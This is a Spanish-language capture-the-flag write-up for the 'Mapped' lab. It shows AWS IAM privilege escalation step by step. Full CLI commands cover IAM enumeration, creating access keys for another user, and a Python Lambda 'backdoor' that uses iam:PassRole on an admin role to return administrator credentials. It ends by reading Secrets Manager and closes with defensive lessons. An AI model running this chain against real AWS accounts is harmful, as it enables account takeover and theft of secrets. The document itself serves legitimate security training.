# Writeup: Mapped (HackSmarter — Medium)

Mapped es una máquina **Medium** diseñada para simular un entorno AWS con múltiples usuarios IAM y una cadena de escalada de privilegios basada en la combinación de permisos de creación de claves de acceso, funciones Lambda y paso de roles (*PassRole*). El recorrido comienza con un usuario de bajo privilegio (`cg-pentest-lab`) que tiene permisos para listar todos los recursos de IAM y crear claves de acceso para cualquier usuario de la cuenta. A través de una auditoría exhaustiva de usuarios, roles y políticas, se identifica un usuario sin políticas gestionadas pero con permisos en línea para crear funciones Lambda y pasar un rol con `AdministratorAccess`. Aprovechando estos permisos, se crea una función Lambda maliciosa que devuelve credenciales temporales con privilegios de administrador. Finalmente, con esas credenciales se accede a Secrets Manager y se recupera la flag.

---

## Fase 1: Configuración inicial de credenciales

Se nos proporcionan unas credenciales de AWS para un usuario IAM. Las configuramos en la CLI de AWS:

```bash
aws configure --profile mapper
```

**Datos proporcionados:**

- `AWS Access Key ID`: `[REDACTED]`
- `AWS Secret Access Key`: `[REDACTED]`
- `Default region name`: `us-east-1`
- `Default output format`: `json`

Verificamos nuestra identidad:

```bash
aws sts get-caller-identity | jq
```

```json
{
  "UserId": "AIDAW5EF2XMH4UCSYPOJK",
  "Account": "474874559247",
  "Arn": "arn:aws:iam::474874559247:user/cg-pentest-lab"
}
```

Somos el usuario IAM `cg-pentest-lab` en la cuenta `474874559247`.

Obtenemos información detallada del usuario:

```bash
aws iam get-user | jq
```

```json
{
  "User": {
    "Path": "/",
    "UserName": "cg-pentest-lab",
    "UserId": "AIDAW5EF2XMH4UCSYPOJK",
    "Arn": "arn:aws:iam::474874559247:user/cg-pentest-lab",
    "CreateDate": "2026-09-20T18:31:02+00:00"
  }
}
```

---

## Fase 2: Auditoría completa de IAM

### 2.1 Volcado de toda la configuración de autorización

El objetivo de la máquina es realizar una auditoría completa de IAM. Para ello, el usuario `cg-pentest-lab` tiene permisos de solo lectura sobre IAM (`IAMReadOnlyAccess`), lo que nos permite obtener **toda** la configuración de la cuenta en una sola llamada:

```bash
aws iam get-account-authorization-details > iam_dump.json
```

Este comando es extremadamente potente en un pentesting de AWS. Devuelve un JSON con:

- Todos los **usuarios** (`UserDetailList`) con sus grupos, políticas gestionadas y políticas en línea.
- Todos los **roles** (`RoleDetailList`) con sus políticas de confianza, políticas gestionadas y políticas en línea.
- Todos los **grupos** (`GroupDetailList`).
- Todas las **políticas** gestionadas (`Policies`).

Tener este volcado local nos permite analizar el entorno sin hacer múltiples llamadas a la API, lo que reduce el ruido y nos permite usar herramientas como `jq` para filtrar y buscar patrones.

### 2.2 Análisis de nuestro propio usuario

Extraemos nuestra información del volcado:

```bash
cat iam_dump.json | jq -r '.UserDetailList[] | select(.UserName=="cg-pentest-lab") | .GroupList, .AttachedManagedPolicies[].PolicyName, .UserPolicyList[].PolicyName'
```

**Resultado:**

```
[]
IAMReadOnlyAccess
cg-pentest-create-access-key-lab
```

**Explicación:**

- **`GroupList: []`**: No pertenecemos a ningún grupo.
- **`IAMReadOnlyAccess`**: Política gestionada por AWS que otorga permisos de solo lectura sobre IAM.
- **`cg-pentest-create-access-key-lab`**: Política en línea específica de este laboratorio.

Obtenemos el contenido de la política en línea:

```bash
aws iam get-user-policy --user-name cg-pentest-lab --policy-name cg-pentest-create-access-key-lab | jq
```

```json
{
  "UserName": "cg-pentest-lab",
  "PolicyName": "cg-pentest-create-access-key-lab",
  "PolicyDocument": {
    "Version": "2012-10-17",
    "Statement": [
      {
        "Action": "iam:CreateAccessKey",
        "Effect": "Allow",
        "Resource": "arn:aws:iam::*:user/*"
      }
    ]
  }
}
```

**Análisis crítico:** Nuestro usuario tiene permiso para **crear claves de acceso para cualquier usuario IAM de la cuenta** (`Resource: arn:aws:iam::*:user/*`). Esto es una vulnerabilidad grave, ya que podemos generar credenciales para cualquier usuario, incluyendo administradores.

### 2.3 Listado de todos los usuarios

```bash
aws iam list-users | jq
```

Hay **muchos usuarios** en la cuenta. La mayoría tienen las mismas políticas adjuntas, por lo que usamos un agente de IA para analizar las políticas de todos los usuarios. El resultado del análisis es el siguiente:

- **100 usuarios** tienen adjuntas dos políticas: `AmazonEC2ReadOnlyAccess` y `AmazonS3ReadOnlyAccess`.
- **`cg-fimnkkgi-lab`** no tiene ninguna política gestionada adjunta (`[]`).
- **`cg-pentest-lab`** (nosotros) tiene únicamente `IAMReadOnlyAccess`.

**Observación clave:** El usuario `cg-fimnkkgi-lab` no tiene políticas gestionadas, lo cual es sospechoso. Decidimos cambiar el enfoque hacia las **políticas en línea** (*inline policies*), que no se muestran en el listado básico.

### 2.4 Análisis de políticas en línea

Usamos un one-liner de `jq` para extraer todas las políticas en línea de todos los usuarios del volcado:

```bash
jq -r '.UserDetailList[] | .UserName as $u | .UserPolicyList[]? |
  "─── \($u) :: \(.PolicyName)",
  (.PolicyDocument.Statement[] |
    "    \(.Effect)  \(.Action | if type=="array" then join(", ") else . end)  →  \(.Resource | if type=="array" then join(", ") else . end)")' iam_dump.json
```

**Resultado:**

```
─── cg-fimnkkgi-lab :: cg-lambda-developer-policy-lab
    Allow  lambda:CreateFunction, lambda:InvokeFunction  →  *
    Allow  iam:PassRole  →  arn:aws:iam::474874559247:role/cg-LambdaAdminExecutionRole-lab
─── cg-pentest-lab :: cg-pentest-create-access-key-lab
    Allow  iam:CreateAccessKey  →  arn:aws:iam::*:user/*
```

**Hallazgo crítico:** El usuario `cg-fimnkkgi-lab` tiene una política en línea llamada `cg-lambda-developer-policy-lab` que le otorga:

- `lambda:CreateFunction`: Crear funciones Lambda.
- `lambda:InvokeFunction`: Invocar funciones Lambda.
- `iam:PassRole`: Pasar el rol `arn:aws:iam::474874559247:role/cg-LambdaAdminExecutionRole-lab` a un servicio de AWS (en este caso, Lambda).

**¿Por qué es peligroso?** La combinación de `lambda:CreateFunction` + `iam:PassRole` permite a un atacante **crear una función Lambda y asignarle un rol con permisos elevados**. Cuando la función se ejecute, tendrá los permisos del rol, lo que permite escalar privilegios.

### 2.5 Análisis del rol objetivo

Extraemos información del rol `cg-LambdaAdminExecutionRole-lab`:

```bash
jq '.RoleDetailList[] | select(.RoleName=="cg-LambdaAdminExecutionRole-lab") |
  {Trust: .AssumeRolePolicyDocument,
   Managed: [.AttachedManagedPolicies[].PolicyName],
   Inline: [.RolePolicyList[].PolicyName]}' iam_dump.json
```

**Resultado:**

```json
{
  "Trust": {
    "Version": "2012-10-17",
    "Statement": [
      {
        "Effect": "Allow",
        "Principal": {
          "Service": "lambda.amazonaws.com"
        },
        "Action": "sts:AssumeRole"
      }
    ]
  },
  "Managed": [
    "AdministratorAccess"
  ],
  "Inline": []
}
```

**Análisis:**

- **Trust Policy**: El rol confía en el servicio `lambda.amazonaws.com`, lo que significa que **solo las funciones Lambda pueden asumir este rol**.
- **Managed Policies**: El rol tiene adjunta la política `AdministratorAccess`, que otorga **permisos totales sobre toda la cuenta de AWS**.
- **Inline Policies**: No tiene.

**Conclusión:** Si conseguimos que una función Lambda asuma este rol, obtendremos credenciales con permisos de administrador.

---

## Fase 3: Escalada de privilegios mediante `iam:CreateAccessKey`

### 3.1 Estrategia

El plan es el siguiente:

1. Usar nuestro permiso `iam:CreateAccessKey` para crear credenciales para el usuario `cg-fimnkkgi-lab` (que tiene los permisos de Lambda).
2. Configurar un perfil de AWS con esas credenciales.
3. Crear una función Lambda que devuelva sus propias credenciales temporales (que serán las del rol `cg-LambdaAdminExecutionRole-lab`).
4. Invocar la función para obtener las credenciales de administrador.
5. Usar esas credenciales para acceder a Secrets Manager.

### 3.2 Creación de claves de acceso para `cg-fimnkkgi-lab`

```bash
aws iam create-access-key --user-name cg-fimnkkgi-lab
```

**Resultado:**

```json
{
    "AccessKey": {
        "UserName": "cg-fimnkkgi-lab",
        "AccessKeyId": "[REDACTED]",
        "Status": "Active",
        "SecretAccessKey": "[REDACTED]",
        "CreateDate": "2026-09-20T20:39:28+00:00"
    }
}
```

**Explicación:** Hemos creado un nuevo par de claves de acceso para el usuario `cg-fimnkkgi-lab`. Estas claves son válidas inmediatamente y nos permiten autenticarnos como ese usuario.

### 3.3 Configuración del perfil de `cg-fimnkkgi-lab`

```bash
aws configure --profile cg-fimnkkgi-lab
```

- `AWS Access Key ID`: `[REDACTED]`
- `AWS Secret Access Key`: `[REDACTED]`
- `Default region name`: `us-east-1`
- `Default output format`: `json`

```bash
export AWS_PROFILE=cg-fimnkkgi-lab
aws sts get-caller-identity | jq
```

```json
{
  "UserId": "AIDAW5EF2XMH6SHT6UDLO",
  "Account": "474874559247",
  "Arn": "arn:aws:iam::474874559247:user/cg-fimnkkgi-lab"
}
```

Ahora somos el usuario `cg-fimnkkgi-lab`.

---

## Fase 4: Escalada de privilegios mediante Lambda + PassRole

### 4.1 Creación de la función Lambda maliciosa

Creamos un archivo `lambda_functions.py` con el siguiente contenido:

```python
import boto3

def lambda_handler(event, context):
    c = boto3.session.Session().get_credentials()
    return {
        "AccessKeyId": c.access_key,
        "SecretAccessKey": c.secret_key,
        "SessionToken": c.token
    }
```

**Explicación del código:**

- Importamos `boto3` para interactuar con los servicios de AWS.
- `boto3.session.Session().get_credentials()` obtiene las credenciales temporales que la función Lambda ha recibido al asumir su rol.
- Devolvemos las credenciales (Access Key, Secret Key y Session Token) como respuesta.

Empaquetamos la función en un archivo ZIP:

```bash
zip function.zip lambda_functions.py
```

### 4.2 Creación de la función Lambda con el rol de administrador

```bash
aws lambda create-function \
  --function-name cg-backdoor \
  --runtime python3.12 \
  --role arn:aws:iam::474874559247:role/cg-LambdaAdminExecutionRole-lab \
  --handler lambda_functions.lambda_handler \
  --zip-file fileb://function.zip
```

**Explicación de parámetros:**

- `--function-name`: Nombre de la función Lambda (`cg-backdoor`).
- `--runtime`: Versión de Python utilizada (`python3.12`).
- `--role`: ARN del rol que la función asumirá. Aquí está la clave: le pasamos el rol `cg-LambdaAdminExecutionRole-lab` que tiene `AdministratorAccess`.
- `--handler`: Punto de entrada de la función (`lambda_functions.lambda_handler`).
- `--zip-file`: Archivo ZIP con el código.

**¿Por qué funciona?** Porque tenemos el permiso `iam:PassRole` sobre ese rol específico. Sin ese permiso, AWS rechazaría la creación de la función.

### 4.3 Invocación de la función Lambda

```bash
aws lambda invoke \
  --function-name cg-backdoor \
  --payload '{}' \
  --cli-binary-format raw-in-base64-out \
  response.json
```

**Explicación de parámetros:**

- `--function-name`: Nombre de la función a invocar.
- `--payload '{}'`: Payload vacío (la función no necesita datos de entrada).
- `--cli-binary-format raw-in-base64-out`: Indica que el payload se pasa en texto plano.
- `response.json`: Archivo donde se guarda la respuesta.

### 4.4 Obtención de las credenciales de administrador

```bash
cat response.json
```

**Resultado:**

```json
{"AccessKeyId": "[REDACTED]", "SecretAccessKey": "[REDACTED]", "SessionToken": "[REDACTED]"}
```

**Hallazgo crítico:** La función Lambda ha devuelto sus credenciales temporales. Estas credenciales corresponden al rol `cg-LambdaAdminExecutionRole-lab`, que tiene `AdministratorAccess`.

### 4.5 Configuración del perfil de administrador

```bash
aws configure --profile admin
```

- `AWS Access Key ID`: `[REDACTED]`
- `AWS Secret Access Key`: `[REDACTED]`
- `AWS Session Token`: `[REDACTED]`
- `Default region name`: `us-east-1`
- `Default output format`: `json`

```bash
export AWS_PROFILE=admin
aws sts get-caller-identity | jq
```

```json
{
  "UserId": "AROAW5EF2XMHWZVFCK5CY:cg-backdoor",
  "Account": "474874559247",
  "Arn": "arn:aws:sts::474874559247:assumed-role/cg-LambdaAdminExecutionRole-lab/cg-backdoor"
}
```

**Éxito:** Ahora estamos asumiendo el rol `cg-LambdaAdminExecutionRole-lab` con privilegios de administrador.

---

## Fase 5: Acceso a Secrets Manager

### 5.1 Listado de secretos

```bash
aws secretsmanager list-secrets | jq
```

**Resultado:**

```json
{
  "SecretList": [
    {
      "ARN": "arn:aws:secretsmanager:us-east-1:474874559247:secret:cg-admin-flag-lab-7lhufy",
      "Name": "cg-admin-flag-lab",
      "Description": "Administrative access verification flag",
      "LastChangedDate": "2026-09-20T14:31:10.863000-04:00",
      "LastAccessedDate": "2026-09-19T20:00:00-04:00",
      "SecretVersionsToStages": {
        "terraform-VIeJMrxRbwH0EcR7bKg45lgAqT": [
          "AWSCURRENT"
        ]
      },
      "CreatedDate": "2026-09-20T14:31:02.803000-04:00"
    }
  ]
}
```

Encontramos el secreto `cg-admin-flag-lab`, que contiene la flag de verificación de acceso administrativo.

### 5.2 Obtención del valor del secreto

```bash
aws secretsmanager get-secret-value --secret-id cg-admin-flag-lab | jq
```

**Resultado:**

```json
{
  "ARN": "arn:aws:secretsmanager:us-east-1:474874559247:secret:cg-admin-flag-lab-7lhufy",
  "Name": "cg-admin-flag-lab",
  "VersionId": "terraform-VIeJMrxRbwH0EcR7bKg45lgAqT",
  "SecretString": "HSM{44c9f2969e2b49e19c9575ec081608a9}",
  "VersionStages": [
    "AWSCURRENT"
  ],
  "CreatedDate": "2026-09-20T14:31:10.858000-04:00"
}
```

**Flag:** `HSM{44c9f2969e2b49e19c9575ec081608a9}`

Hemos completado el objetivo: acceder a Secrets Manager con privilegios de administrador y recuperar la flag.

---

## 📌 Conclusión

Mapped es una máquina **Medium** que combina:

1. **Enumeración de IAM** con un usuario de bajo privilegio (`cg-pentest-lab`) que tiene `IAMReadOnlyAccess` y `iam:CreateAccessKey`.
2. **Auditoría completa de IAM** usando `get-account-authorization-details` para obtener todos los usuarios, roles y políticas en un solo volcado.
3. **Análisis de políticas en línea** con `jq` para identificar al usuario `cg-fimnkkgi-lab` y su política `cg-lambda-developer-policy-lab`.
4. **Identificación de la cadena de escalada**: `lambda:CreateFunction` + `iam:PassRole` sobre un rol con `AdministratorAccess`.
5. **Creación de claves de acceso** para `cg-fimnkkgi-lab` usando el permiso `iam:CreateAccessKey`.
6. **Creación de una función Lambda maliciosa** que asume el rol de administrador y devuelve sus credenciales.
7. **Obtención de credenciales de administrador** mediante la invocación de la función Lambda.
8. **Acceso a Secrets Manager** con las credenciales de administrador y recuperación de la flag.

---

## 📚 Lecciones aprendidas

1. **`iam:CreateAccessKey` sobre `*` es extremadamente peligroso**  
   Permitir que un usuario cree claves de acceso para cualquier otro usuario de la cuenta es una vulnerabilidad crítica. Un atacante puede generar credenciales para un usuario con más privilegios y escalar fácilmente. Este permiso debe restringirse a usuarios específicos o eliminarse por completo.

2. **`iam:PassRole` combinado con `lambda:CreateFunction` permite RCE en AWS**  
   La combinación de estos dos permisos permite a un atacante crear una función Lambda y asignarle un rol con privilegios elevados. La función, al ejecutarse, tendrá los permisos del rol, lo que resulta en una escalada de privilegios. `iam:PassRole` debe restringirse a roles específicos y solo otorgarse a servicios que realmente lo necesiten.

3. **Los roles con `AdministratorAccess` deben ser extremadamente restrictivos**  
   El rol `cg-LambdaAdminExecutionRole-lab` tenía `AdministratorAccess`. Aunque su política de confianza solo permitía a Lambda asumirlo, la combinación con `iam:PassRole` permitió a un usuario de bajo privilegio ejecutar código con esos permisos. Los roles con privilegios elevados deben tener políticas de confianza estrictas y ser auditados regularmente.

4. **La auditoría de IAM es fundamental en un pentesting de AWS**  
   El comando `get-account-authorization-details` proporciona una vista completa de todos los usuarios, roles y políticas. Esta información es esencial para identificar cadenas de escalada de privilegios. Los pentesters deben aprovechar esta capacidad y usar herramientas como `jq` para analizar los datos.

5. **Las políticas en línea pueden pasar desapercibidas**  
   El usuario `cg-fimnkkgi-lab` no tenía políticas gestionadas, lo que inicialmente podría hacer que se pasara por alto. Sin embargo, sus políticas en línea contenían los permisos necesarios para la escalada. Las auditorías deben incluir tanto políticas gestionadas como en línea.

6. **El principio de mínimo privilegio debe aplicarse en todos los niveles**  
   Tanto el usuario `cg-pentest-lab` (con `CreateAccessKey` sobre `*`) como el rol `cg-LambdaAdminExecutionRole-lab` (con `AdministratorAccess`) tenían permisos excesivos. La aplicación del principio de mínimo privilegio habría prevenido la escalada.

7. **Las credenciales temporales de Lambda pueden ser exfiltradas**  
   La función Lambda maliciosa devolvió sus credenciales temporales en la respuesta. Aunque las credenciales son temporales, son suficientes para comprometer la cuenta. Los roles de Lambda deben tener permisos limitados y las funciones deben ser auditadas para detectar código malicioso.

8. **La visibilidad y el monitoreo son esenciales**  
   La creación de una función Lambda con un rol de administrador debería generar alertas en CloudTrail. La organización debe monitorear eventos como `CreateFunction` con roles privilegiados y `CreateAccessKey` para usuarios inesperados.
